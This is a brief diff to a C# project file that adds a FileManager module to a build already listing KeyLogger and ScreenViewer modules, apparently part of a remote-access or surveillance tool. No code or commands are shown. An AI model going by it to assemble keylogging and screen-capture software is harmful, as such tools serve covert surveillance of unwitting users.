@@ -62,6 +62,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Config.cs" />
+    <Compile Include="Features\FileManager.cs" />
     <Compile Include="Features\KeyLogger.cs" />
     <Compile Include="Features\ScreenViewer.cs" />
     <Compile Include="Program.cs" />
